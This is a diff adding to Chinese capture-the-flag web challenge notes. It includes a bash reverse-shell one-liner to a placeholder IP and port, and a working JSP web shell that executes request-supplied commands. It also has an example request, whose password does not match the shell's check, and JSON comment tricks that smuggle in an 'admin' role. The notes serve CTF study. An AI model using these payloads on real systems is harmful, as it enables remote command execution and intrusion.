@@ -1148,3 +1148,12 @@ function check($str){
 - 不过有C在的情况，会先检测这里类是否实现了Serializable接口。如果有的话，会将里面的值传入重写的unserialize方法。这是可以正常解析的，所以可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。ArrayObject正是其中之一。
 186. linux终端bash反弹shell命令。`bash -c "bash -l > /dev/tcp/IP/PORT 0<&1 2>&1"`
 187. linux系统下的flag可能藏在环境变量中。可用`env`或`printenv`命令查看环境变量。
+188. [babycat](https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat)
+- java网站任意文件读取（读取WEB-INF/web.xml获取网站结构并读取源码）
+- jsp一句话木马。
+```jsp
+<% if("a".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>
+```
+
+请求：`http://x.x.x.x/cmd.jsp?pwd=b&i=ls`
+- json解析特性：JSON 中的内联注释不会影响其解析。如`{"username":"LemonPrefect","password":"pass","role":"superUserLemonPrefect","role"/**/:"admin"}`或`{"username":"LemonPrefect","password":"pass","role":"admin"/*,"role":"guest"*/}`。前者`"role"/**/:"admin"`会正常解析，后者`/*,"role":"guest"*/`不会解析（解析出来role是admin）
